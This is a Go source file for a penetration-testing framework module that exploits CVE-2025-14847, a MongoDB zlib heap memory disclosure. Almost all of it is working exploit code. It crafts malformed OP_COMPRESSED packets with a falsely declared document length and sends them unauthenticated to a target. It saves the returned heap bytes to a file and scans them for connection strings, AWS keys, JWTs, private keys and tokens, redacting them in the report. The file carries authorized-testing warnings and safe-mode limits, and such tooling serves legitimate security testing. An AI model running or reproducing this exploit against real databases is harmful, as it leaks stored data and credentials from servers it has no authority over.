// Package main implements the SanTaiZi "cve_2025_14847" module.
//
// The module ports the MongoDB zlib memory-disclosure proof of concept from
// github.com/ctkqiang/CVE-Exploits/tree/main/CVE-2025-14847. It connects to a
// MongoDB wire endpoint, sends the crafted OP_COMPRESSED request and captures
// returned heap bytes. It is extraction-only: no credential is validated,
// replayed, stuffed or used to authenticate.
package main

import (
	"bytes"
	"compress/zlib"
	"context"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"time"

	"santaizi/sdk"
)

const (
	cveModuleName = "cve_2025_14847"

	mongoOpCompressed = 2012
	mongoOpMsg        = 2013
	mongoZlib         = 2

	mongoSafeReadLimit = 4096
	mongoUnsafeCap     = 8 << 20
	mongoUnsafeProbes  = 256
)

var (
	_ sdk.Module = (*CVE202514847Module)(nil)

	mongoVersionRE      = regexp.MustCompile(`(?s)version[\x00-\x20:=]{0,12}([0-9]+\.[0-9]+\.[0-9]+)`)
	mongoVersionNumRE   = regexp.MustCompile(`[0-9]+\.[0-9]+\.[0-9]+`)
	mongoURIRE          = regexp.MustCompile(`mongodb(?:\+srv)?://[^\s"'<>\x00]+`)
	mongoURIUserInfoRE  = regexp.MustCompile(`://([^:/@]+):([^@/]+)@`)
	mongoAWSKeyRE       = regexp.MustCompile(`\bAKIA[0-9A-Z]{16}\b`)
	mongoJWTRE          = regexp.MustCompile(`\beyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\b`)
	mongoPrivateKeyRE   = regexp.MustCompile(`-----BEGIN (?:RSA |EC |OPENSSH |DSA )?PRIVATE KEY-----`)
	mongoBearerRE       = regexp.MustCompile(`(?i)\bbearer\s+([A-Za-z0-9._~+/-]{16,}=*)`)
	mongoAssignmentRE   = regexp.MustCompile(`(?i)\b(password|passwd|pwd|secret|api[_-]?key|token)\b\s*[:=]\s*["']?([^\s\x00-\x1f"'&,;]{6,})`)
	mongoFieldNameRE    = regexp.MustCompile(`field name '([^']*)'`)
	mongoTypeRE         = regexp.MustCompile(`type (\d+)`)
	mongoNoiseFragments = map[string]struct{}{
		"": {}, "?": {}, "a": {}, "$db": {}, "ping": {}, "ismaster": {}, "hello": {},
		"admin": {}, "true": {}, "false": {}, "ok": {}, "version": {},
	}
)

// CVE202514847Module implements sdk.Module.
type CVE202514847Module struct {
	sdk.BaseModule
}

// Info advertises the module to the SanTaiZi registry.
func (m *CVE202514847Module) Info() sdk.ModuleConfig {
	return sdk.ModuleConfig{
		Name:        cveModuleName,
		Description: "MongoDB zlib memory disclosure (CVE-2025-14847, CVSS 8.7): unauthenticated remote heap memory information leak. Extraction-only.",
		CNVD:        "CNVD-2025-30245",
		CVE:         "CVE-2025-14847",
		Options: []sdk.Option{
			{Name: "target", Type: "string", Required: true, Default: ""},
			{Name: "output", Type: "string", Required: false, Default: "leak.bin"},
			{Name: "safe_mode", Type: "bool", Required: false, Default: "true"},
		},
	}
}

// Init validates the target and prints the upstream authorized-use warning.
func (m *CVE202514847Module) Init(options map[string]string) error {
	m.Config = map[string]string{
		"target":    "",
		"output":    "leak.bin",
		"safe_mode": "true",
	}
	for key, value := range options {
		m.Config[key] = value
	}

	fmt.Fprintln(os.Stderr, "AUTHORIZED TESTING ONLY: CVE-2025-14847 is an extraction-only memory-disclosure module. 仅用于授权测试：仅在获得明确书面授权的环境中使用。严禁在未授权情况下对任何 MongoDB 实例进行扫描、攻击或利用。")

	target := strings.TrimSpace(m.GetOption("target"))
	if target == "" {
		return fmt.Errorf("cve_2025_14847: option \"target\" is required")
	}
	parsed, err := parseMongoTarget(target)
	if err != nil {
		return err
	}
	m.Config["target"] = parsed.display

	output := strings.TrimSpace(m.GetOption("output"))
	if output == "" {
		output = "leak.bin"
	}
	absolute, err := filepath.Abs(output)
	if err != nil {
		return fmt.Errorf("cve_2025_14847: resolve output path: %w", err)
	}
	m.Config["output"] = absolute
	if strings.TrimSpace(m.GetOption("safe_mode")) == "" {
		m.Config["safe_mode"] = "true"
	}
	m.Config["safe_mode"] = strconv.FormatBool(parseMongoBool(m.GetOption("safe_mode")))

	if !parseMongoBool(m.GetOption("safe_mode")) {
		fmt.Fprintln(os.Stderr, "WARNING: safe_mode=false enables the full multi-offset leak sweep. It may destabilize the target and is bounded to 256 probes / 8 MiB in this module. Use only in an authorized lab.")
	}

	return nil
}

// Run performs the extraction and returns the structured report.
func (m *CVE202514847Module) Run() (string, error) {
	target, err := parseMongoTarget(m.GetOption("target"))
	if err != nil {
		return "", err
	}
	output := strings.TrimSpace(m.GetOption("output"))
	if output == "" {
		output = "leak.bin"
	}
	safeMode := true
	if value, ok := m.Config["safe_mode"]; ok {
		safeMode = parseMongoBool(value)
	}

	ctx, cancel := context.WithTimeout(context.Background(), 120*time.Second)
	defer cancel()

	version, helloDetail := mongoHello(ctx, target)

	var (
		allData       bytes.Buffer
		fragments     []string
		probes        int
		bytesLeaked   int
		lastError     string
		responseBytes int
	)

	offsets := []int{1, 64, 256}
	if !safeMode {
		offsets = make([]int, 0, mongoUnsafeProbes)
		for offset := 1; offset <= mongoUnsafeProbes; offset++ {
			offsets = append(offsets, offset)
		}
	}

	seen := map[string]struct{}{}
	for _, docLength := range offsets {
		if ctx.Err() != nil {
			lastError = ctx.Err().Error()
			break
		}
		bufferSize := docLength + 500
		if safeMode {
			bufferSize = mongoSafeReadLimit
		}
		readLimit := mongoSafeReadLimit
		if !safeMode {
			readLimit = 1 << 20
		}

		response, probeErr := sendMongoProbe(ctx, target, docLength, bufferSize, readLimit)
		probes++
		if probeErr != nil {
			lastError = probeErr.Error()
			continue
		}
		responseBytes += len(response)
		leaked := extractMongoLeaks(response)
		if len(leaked) == 0 {
			continue
		}
		if safeMode {
			remaining := mongoSafeReadLimit - bytesLeaked
			if remaining <= 0 {
				break
			}
			if len(leaked) > remaining {
				leaked = leaked[:remaining]
			}
		}
		bytesLeaked += len(leaked)
		allData.Write(leaked)
		allData.WriteByte('\n')

		for _, fragment := range leakFragments(leaked) {
			if _, ok := seen[fragment]; ok {
				continue
			}
			seen[fragment] = struct{}{}
			fragments = append(fragments, fragment)
			if len(fragments) >= 400 {
				break
			}
		}
		if !safeMode && allData.Len() >= mongoUnsafeCap {
			break
		}
		if safeMode && bytesLeaked >= mongoSafeReadLimit {
			break
		}
	}

	credentialMatches := findMongoCredentials(allData.Bytes())
	highConfidence := 0
	heuristic := 0
	for _, match := range credentialMatches {
		if match.high {
			highConfidence++
		} else {
			heuristic++
		}
	}
	keywordHits := findMongoKeywordHits(allData.Bytes())
	writeErr := writeMongoOutput(output, allData.Bytes())
	versionAssessment := assessMongoVersion(version)

	lines := []string{
		"CVE-2025-14847 — MONGODB ZLIB HEAP MEMORY DISCLOSURE (EXTRACTION-ONLY)",
		"=====================================================================",
		"Target: " + sanitizeMongoText(target.display, 120),
		"Mode: " + mongoModeLine(safeMode),
		"MongoDB preflight: " + helloDetail,
		"Version assessment: " + versionAssessment,
		"",
		"Extraction summary:",
		fmt.Sprintf("  Probes issued: %d", probes),
		fmt.Sprintf("  Response bytes observed: %d", responseBytes),
		fmt.Sprintf("  Leaked bytes retained: %d", bytesLeaked),
		fmt.Sprintf("  Unique fragments: %d", len(fragments)),
		fmt.Sprintf("  High-confidence credential matches: %d", highConfidence),
		fmt.Sprintf("  Heuristic key/value assignments: %d", heuristic),
		fmt.Sprintf("  Keyword hits (low confidence): %s", listOrNoneMongo(keywordHits)),
	}

	if len(fragments) > 0 {
		lines = append(lines, "", "Leak evidence (sanitized fragments, first 12):")
		for index, fragment := range fragments {
			if index >= 12 {
				break
			}
			lines = append(lines, "  - "+fragment)
		}
	}

	lines = append(lines, "", "Credential-pattern matches (values redacted):")
	if len(credentialMatches) == 0 {
		lines = append(lines, "  none — no credential pattern matched the retained bytes")
	} else {
		for _, match := range credentialMatches {
			label := "heuristic"
			if match.high {
				label = "high"
			}
			lines = append(lines, "  - ["+label+"] "+match.kind+": "+match.preview)
		}
	}

	lines = append(lines, "", "Output:")
	if writeErr != nil {
		lines = append(lines, "  write failed: "+writeErr.Error())
	} else {
		lines = append(lines, "  "+output+" (mode 0600; raw retained bytes, treat as sensitive)")
	}
	if lastError != "" {
		lines = append(lines, "", "Transport notes:")
		lines = append(lines, "  last error: "+sanitizeMongoText(lastError, 220))
	}

	lines = append(lines, "", "ATT&CK:")
	for _, item := range mongoATTACK() {
		lines = append(lines, "  - "+item)
	}

	lines = append(lines,
		"",
		"Interpretation:",
		"  A positive leak is evidence that the target returned heap bytes beyond the decompressed request.",
		"  Zero retained bytes is INCONCLUSIVE, not proof of a patch: zlib may be disabled, authentication/network policy may have rejected the probe, or the malformed request may have been sanitized.",
		"",
		"Safety: extraction-only. No credential found in the leak was validated, replayed, stuffed or used to authenticate.",
		"Authorized testing only. 本工具仅用于授权测试；严禁非法使用。作者、贡献者及维护者不对滥用造成的损失承担责任。",
	)
	if !safeMode {
		lines = append(lines,
			"",
			"WARNING: safe_mode=false ran the multi-offset sweep (bounded to 256 probes / 8 MiB).",
			"Full exploitation may destabilize the target; a lab or an explicitly approved maintenance window is required.",
		)
	}

	return strings.Join(lines, "\n"), nil
}

// ---------------------------------------------------------------------------
// Target parsing
// ---------------------------------------------------------------------------

type mongoTarget struct {
	host    string
	port    int
	display string
}

func parseMongoTarget(raw string) (mongoTarget, error) {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return mongoTarget{}, fmt.Errorf("cve_2025_14847: empty target")
	}
	if strings.HasPrefix(strings.ToLower(raw), "mongodb+srv://") {
		return mongoTarget{}, fmt.Errorf("cve_2025_14847: mongodb+srv:// requires DNS SRV resolution and is not supported; supply host:port")
	}
	if strings.Contains(raw, "://") {
		parsed, err := url.Parse(raw)
		if err != nil {
			return mongoTarget{}, fmt.Errorf("cve_2025_14847: parse target: %w", err)
		}
		if parsed.Scheme != "mongodb" {
			return mongoTarget{}, fmt.Errorf("cve_2025_14847: unsupported scheme %q (mongodb:// or host:port)", parsed.Scheme)
		}
		if parsed.User != nil {
			return mongoTarget{}, fmt.Errorf("cve_2025_14847: credentials in the target URL are not supported; this module never authenticates")
		}
		host := parsed.Hostname()
		if host == "" {
			return mongoTarget{}, fmt.Errorf("cve_2025_14847: target has no host")
		}
		port := 27017
		if value := parsed.Port(); value != "" {
			port, err = strconv.Atoi(value)
			if err != nil || port < 1 || port > 65535 {
				return mongoTarget{}, fmt.Errorf("cve_2025_14847: invalid port %q", value)
			}
		}
		return mongoTarget{host: host, port: port, display: net.JoinHostPort(host, strconv.Itoa(port))}, nil
	}

	if host, portText, err := net.SplitHostPort(raw); err == nil {
		port, parseErr := strconv.Atoi(portText)
		if parseErr != nil || port < 1 || port > 65535 {
			return mongoTarget{}, fmt.Errorf("cve_2025_14847: invalid port %q", portText)
		}
		return mongoTarget{host: host, port: port, display: net.JoinHostPort(host, strconv.Itoa(port))}, nil
	}

	host := strings.Trim(raw, "[]")
	if host == "" {
		return mongoTarget{}, fmt.Errorf("cve_2025_14847: target has no host")
	}
	return mongoTarget{host: host, port: 27017, display: net.JoinHostPort(host, "27017")}, nil
}

// ---------------------------------------------------------------------------
// MongoDB wire protocol
// ---------------------------------------------------------------------------

func mongoHello(ctx context.Context, target mongoTarget) (string, string) {
	bson := encodeMongoDocument([]mongoField{
		{kind: 0x10, name: "hello", int32: 1},
		{kind: 0x02, name: "$db", text: "admin"},
	})
	packet := buildMongoOpMsg(bson, 1)
	response, err := roundTripMongo(ctx, target, packet, 1<<20)
	if err != nil {
		return "", "hello probe failed: " + sanitizeMongoText(err.Error(), 160)
	}
	version := mongoWireVersion(response)
	if version == "" {
		return "", "connected; hello response did not expose a parseable version"
	}
	return version, "connected; server reported version " + version
}

func mongoWireVersion(response []byte) string {
	payload := mongoResponsePayload(response)
	if match := mongoVersionRE.FindSubmatch(payload); len(match) == 2 {
		return string(match[1])
	}
	// BSON strings are NUL-terminated; also try the full response for servers
	// that answer with a compressed frame.
	if match := mongoVersionRE.FindSubmatch(response); len(match) == 2 {
		return string(match[1])
	}
	return ""
}

func sendMongoProbe(ctx context.Context, target mongoTarget, docLength, bufferSize, readLimit int) ([]byte, error) {
	// A minimal BSON document whose declared length is much larger than the
	// bytes actually supplied. The vulnerable decoder allocates bufferSize and
	// returns the whole buffer, including uninitialized heap.
	bsonData := make([]byte, 4+7)
	binary.LittleEndian.PutUint32(bsonData[0:4], uint32(docLength))
	copy(bsonData[4:], []byte{0x10, 'a', 0x00, 0x01, 0x00, 0x00, 0x00})

	opMsg := make([]byte, 4+1+len(bsonData))
	binary.LittleEndian.PutUint32(opMsg[0:4], 0) // flagBits
	opMsg[4] = 0                                 // section kind 0 (body)
	copy(opMsg[5:], bsonData)

	var compressed bytes.Buffer
	writer := zlib.NewWriter(&compressed)
	if _, err := writer.Write(opMsg); err != nil {
		_ = writer.Close()
		return nil, err
	}
	if err := writer.Close(); err != nil {
		return nil, err
	}

	payload := make([]byte, 0, 4+4+1+compressed.Len())
	payload = binary.LittleEndian.AppendUint32(payload, mongoOpMsg)
	payload = binary.LittleEndian.AppendUint32(payload, uint32(bufferSize))
	payload = append(payload, mongoZlib)
	payload = append(payload, compressed.Bytes()...)

	packet := make([]byte, 0, 16+len(payload))
	packet = binary.LittleEndian.AppendUint32(packet, uint32(16+len(payload)))
	packet = binary.LittleEndian.AppendUint32(packet, 1)
	packet = binary.LittleEndian.AppendUint32(packet, 0)
	packet = binary.LittleEndian.AppendUint32(packet, mongoOpCompressed)
	packet = append(packet, payload...)

	return roundTripMongo(ctx, target, packet, readLimit)
}

func buildMongoOpMsg(bson []byte, requestID int32) []byte {
	payload := make([]byte, 0, 4+1+len(bson))
	payload = binary.LittleEndian.AppendUint32(payload, 0)
	payload = append(payload, 0)
	payload = append(payload, bson...)
	packet := make([]byte, 0, 16+len(payload))
	packet = binary.LittleEndian.AppendUint32(packet, uint32(16+len(payload)))
	packet = binary.LittleEndian.AppendUint32(packet, uint32(requestID))
	packet = binary.LittleEndian.AppendUint32(packet, 0)
	packet = binary.LittleEndian.AppendUint32(packet, mongoOpMsg)
	return append(packet, payload...)
}

type mongoField struct {
	kind  byte
	name  string
	text  string
	int32 int32
}

func encodeMongoDocument(fields []mongoField) []byte {
	body := make([]byte, 0, 64)
	for _, field := range fields {
		body = append(body, field.kind)
		body = append(body, field.name...)
		body = append(body, 0x00)
		switch field.kind {
		case 0x10:
			body = binary.LittleEndian.AppendUint32(body, uint32(field.int32))
		case 0x02:
			body = binary.LittleEndian.AppendUint32(body, uint32(len(field.text)+1))
			body = append(body, field.text...)
			body = append(body, 0x00)
		}
	}
	body = append(body, 0x00)
	document := make([]byte, 4, 4+len(body))
	binary.LittleEndian.PutUint32(document[0:4], uint32(4+len(body)))
	return append(document, body...)
}

func roundTripMongo(ctx context.Context, target mongoTarget, packet []byte, readLimit int) ([]byte, error) {
	dialer := &net.Dialer{Timeout: 5 * time.Second}
	conn, err := dialer.DialContext(ctx, "tcp", net.JoinHostPort(target.host, strconv.Itoa(target.port)))
	if err != nil {
		return nil, fmt.Errorf("connect: %w", err)
	}
	defer func() {
		_ = conn.Close()
	}()
	_ = conn.SetDeadline(time.Now().Add(8 * time.Second))

	if _, err := conn.Write(packet); err != nil {
		return nil, fmt.Errorf("write probe: %w", err)
	}

	header := make([]byte, 4)
	if _, err := io.ReadFull(conn, header); err != nil {
		return nil, fmt.Errorf("read response header: %w", err)
	}
	length := int(binary.LittleEndian.Uint32(header))
	if length < 16 || length > 16<<20 {
		return nil, fmt.Errorf("response length %d is outside the accepted range", length)
	}
	if length > readLimit {
		length = readLimit
	}
	body := make([]byte, length-4)
	if _, err := io.ReadFull(conn, body); err != nil {
		return nil, fmt.Errorf("read response body: %w", err)
	}
	return append(header, body...), nil
}

func mongoResponsePayload(response []byte) []byte {
	if len(response) < 16 {
		return response
	}
	opcode := binary.LittleEndian.Uint32(response[12:16])
	if opcode != mongoOpCompressed {
		if len(response) > 16 {
			return response[16:]
		}
		return response
	}
	if len(response) < 25 {
		return response
	}
	compressed := response[25:]
	reader, err := zlib.NewReader(bytes.NewReader(compressed))
	if err != nil {
		return compressed
	}
	defer func() {
		_ = reader.Close()
	}()
	decompressed, err := io.ReadAll(io.LimitReader(reader, 8<<20))
	if err != nil {
		return compressed
	}
	return decompressed
}

func extractMongoLeaks(response []byte) []byte {
	payload := mongoResponsePayload(response)
	if len(payload) == 0 {
		return nil
	}
	return append([]byte(nil), payload...)
}

// ---------------------------------------------------------------------------
// Leak and credential analysis
// ---------------------------------------------------------------------------

func leakFragments(data []byte) []string {
	var fragments []string
	seen := map[string]struct{}{}

	add := func(value string) {
		value = sanitizeMongoText(redactMongoLeakText(value), 200)
		if value == "" {
			return
		}
		if _, noise := mongoNoiseFragments[strings.ToLower(strings.TrimSpace(value))]; noise {
			return
		}
		if _, ok := seen[value]; ok {
			return
		}
		seen[value] = struct{}{}
		fragments = append(fragments, value)
	}

	for _, match := range mongoFieldNameRE.FindAllSubmatch(data, -1) {
		if len(match) >= 2 {
			add(string(match[1]))
		}
	}
	for _, match := range mongoTypeRE.FindAllSubmatch(data, -1) {
		if len(match) >= 2 {
			add("bson-type=" + string(match[1]))
		}
	}

	current := make([]byte, 0, 128)
	flush := func() {
		if len(current) >= 4 {
			add(string(current))
		}
		current = current[:0]
	}
	for _, char := range data {
		if char >= 32 && char <= 126 {
			current = append(current, char)
		} else {
			flush()
		}
	}
	flush()

	sort.SliceStable(fragments, func(i, j int) bool {
		return len(fragments[i]) > len(fragments[j])
	})
	return fragments
}

type mongoCredential struct {
	kind    string
	preview string
	high    bool
}

func findMongoCredentials(data []byte) []mongoCredential {
	if len(data) == 0 {
		return nil
	}
	text := string(data)
	seen := map[string]struct{}{}
	var matches []mongoCredential
	add := func(kind, preview string, high bool) {
		preview = sanitizeMongoText(preview, 120)
		key := kind + "|" + preview
		if _, ok := seen[key]; ok {
			return
		}
		seen[key] = struct{}{}
		matches = append(matches, mongoCredential{kind: kind, preview: preview, high: high})
	}

	for _, match := range mongoURIRE.FindAllString(text, -1) {
		add("MongoDB URI", redactMongoURI(match), true)
	}
	for _, match := range mongoAWSKeyRE.FindAllString(text, -1) {
		add("AWS access key", redactMongoSecret(match), true)
	}
	for _, match := range mongoJWTRE.FindAllString(text, -1) {
		add("JWT", redactMongoJWT(match), true)
	}
	for range mongoPrivateKeyRE.FindAllString(text, -1) {
		add("private key header", "-----BEGIN … PRIVATE KEY-----", true)
	}
	for _, match := range mongoBearerRE.FindAllStringSubmatch(text, -1) {
		if len(match) >= 2 {
			add("bearer token", redactMongoSecret(match[1]), true)
		}
	}
	for _, match := range mongoAssignmentRE.FindAllStringSubmatch(text, -1) {
		if len(match) >= 3 {
			add("key/value assignment ("+strings.ToLower(match[1])+")", redactMongoSecret(match[2]), false)
		}
	}
	return matches
}

func findMongoKeywordHits(data []byte) []string {
	if len(data) == 0 {
		return nil
	}
	lower := strings.ToLower(string(data))
	keywords := []string{"password", "passwd", "secret", "token", "api_key", "apikey", "authorization", "mongodb://", "aws_access_key_id"}
	var hits []string
	for _, keyword := range keywords {
		if strings.Contains(lower, keyword) {
			hits = append(hits, keyword)
		}
	}
	return hits
}

func redactMongoLeakText(value string) string {
	value = mongoURIRE.ReplaceAllStringFunc(value, redactMongoURI)
	value = mongoAWSKeyRE.ReplaceAllStringFunc(value, redactMongoSecret)
	value = mongoJWTRE.ReplaceAllStringFunc(value, redactMongoJWT)
	value = mongoPrivateKeyRE.ReplaceAllString(value, "-----BEGIN … PRIVATE KEY-----")
	value = mongoBearerRE.ReplaceAllStringFunc(value, func(match string) string {
		parts := mongoBearerRE.FindStringSubmatch(match)
		if len(parts) >= 2 {
			return "bearer " + redactMongoSecret(parts[1])
		}
		return match
	})
	value = mongoAssignmentRE.ReplaceAllStringFunc(value, func(match string) string {
		parts := mongoAssignmentRE.FindStringSubmatch(match)
		if len(parts) >= 3 {
			return parts[1] + "=REDACTED"
		}
		return match
	})
	return value
}

func redactMongoURI(value string) string {
	parsed, err := url.Parse(value)
	if err != nil || parsed.User == nil {
		return mongoURIUserInfoRE.ReplaceAllString(value, "://$1:REDACTED@")
	}
	username := parsed.User.Username()
	if _, hasPassword := parsed.User.Password(); hasPassword {
		parsed.User = url.UserPassword(username, "REDACTED")
	}
	return parsed.String()
}

func redactMongoJWT(value string) string {
	parts := strings.Split(value, ".")
	if len(parts) != 3 {
		return redactMongoSecret(value)
	}
	return parts[0] + ".…." + parts[2][:minInt(6, len(parts[2]))]
}

func redactMongoSecret(value string) string {
	if len(value) <= 8 {
		return strings.Repeat("*", len(value))
	}
	return value[:4] + "…" + value[len(value)-2:]
}

func minInt(left, right int) int {
	if left < right {
		return left
	}
	return right
}

// ---------------------------------------------------------------------------
// Version assessment and output
// ---------------------------------------------------------------------------

func assessMongoVersion(version string) string {
	if version == "" {
		return "unknown (preflight did not expose a version; extraction was still attempted)"
	}
	parsed := parseMongoVersion(version)
	if parsed == nil {
		return "unknown (unparseable version " + sanitizeMongoText(version, 40) + ")"
	}
	major, minor, patch := parsed[0], parsed[1], parsed[2]

	type branch struct {
		major, minor int
		fixedPatch   int
	}
	branches := []branch{
		{8, 2, 3},
		{8, 0, 17},
		{7, 0, 28},
		{6, 0, 27},
		{5, 0, 32},
		{4, 4, 30},
	}
	for _, item := range branches {
		if major == item.major && minor == item.minor {
			if patch < item.fixedPatch {
				return fmt.Sprintf("AFFECTED branch %d.%d: %s is below the fixed release %d.%d.%d", major, minor, version, item.major, item.minor, item.fixedPatch)
			}
			return fmt.Sprintf("outside the affected range for branch %d.%d: %s is at or above %d.%d.%d", major, minor, version, item.major, item.minor, item.fixedPatch)
		}
	}
	if major == 4 && (minor == 0 || minor == 2) {
		return fmt.Sprintf("END-OF-LIFE branch %d.%d: %s receives no upstream fix for this bug class", major, minor, version)
	}
	if major == 3 && minor == 6 {
		return fmt.Sprintf("END-OF-LIFE branch 3.6: %s receives no upstream fix for this bug class", version)
	}
	if major < 4 {
		return fmt.Sprintf("END-OF-LIFE: %s is outside the maintained branches", version)
	}
	return fmt.Sprintf("not in the built-in table: %s — verify against the current MongoDB advisory", version)
}

func parseMongoVersion(version string) []int {
	match := mongoVersionNumRE.FindString(version)
	if match == "" {
		return nil
	}
	parts := strings.Split(match, ".")
	result := make([]int, 0, 3)
	for _, part := range parts {
		number, err := strconv.Atoi(part)
		if err != nil {
			return nil
		}
		result = append(result, number)
	}
	return result
}

func writeMongoOutput(path string, data []byte) error {
	directory := filepath.Dir(path)
	if directory != "." {
		if err := os.MkdirAll(directory, 0o700); err != nil {
			return err
		}
	}
	file, err := os.OpenFile(path, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0o600)
	if err != nil {
		return err
	}
	if _, err := file.Write(data); err != nil {
		_ = file.Close()
		return err
	}
	if err := file.Close(); err != nil {
		return err
	}
	return os.Chmod(path, 0o600)
}

// ---------------------------------------------------------------------------
// Report helpers
// ---------------------------------------------------------------------------

func mongoModeLine(safe bool) string {
	if safe {
		return "safe_mode=true (up to 3 bounded probes; retained leak capped at 4096 bytes)"
	}
	return fmt.Sprintf("safe_mode=false (multi-offset sweep; bounded to %d probes / %d MiB)", mongoUnsafeProbes, mongoUnsafeCap>>20)
}

func mongoATTACK() []string {
	return []string{
		"T1190 Exploit Public-Facing Application (Initial Access) — the crafted OP_COMPRESSED request reaches the MongoDB wire parser before authentication. https://attack.mitre.org/techniques/T1190/",
		"T1005 Data from Local System (Collection) — uninitialized process heap is returned in the response. https://attack.mitre.org/techniques/T1005/",
		"T1552 Unsecured Credentials (Credential Access) — leaked memory may contain connection strings, API keys and session material. https://attack.mitre.org/techniques/T1552/",
		"T1213 Data from Information Repositories (Collection) — recovered documents and index fragments can disclose stored records. https://attack.mitre.org/techniques/T1213/",
	}
}

func listOrNoneMongo(values []string) string {
	if len(values) == 0 {
		return "none"
	}
	return strings.Join(values, ", ")
}

func sanitizeMongoText(value string, max int) string {
	value = strings.TrimSpace(value)
	var builder strings.Builder
	for _, char := range value {
		switch {
		case char == '\n' || char == '\r' || char == '\t':
			builder.WriteByte(' ')
		case char >= 0x200b && char <= 0x200f, char >= 0x202a && char <= 0x202e,
			char >= 0x2066 && char <= 0x2069, char == 0xfeff:
			continue
		case char >= 32 && char != 127:
			builder.WriteRune(char)
		}
	}
	result := strings.Join(strings.Fields(builder.String()), " ")
	if len(result) > max {
		return result[:max] + "…"
	}
	return result
}

func parseMongoBool(value string) bool {
	switch strings.ToLower(strings.TrimSpace(value)) {
	case "1", "true", "yes", "on", "y":
		return true
	default:
		return false
	}
}

func main() {
	sdk.RunModule(&CVE202514847Module{})
}
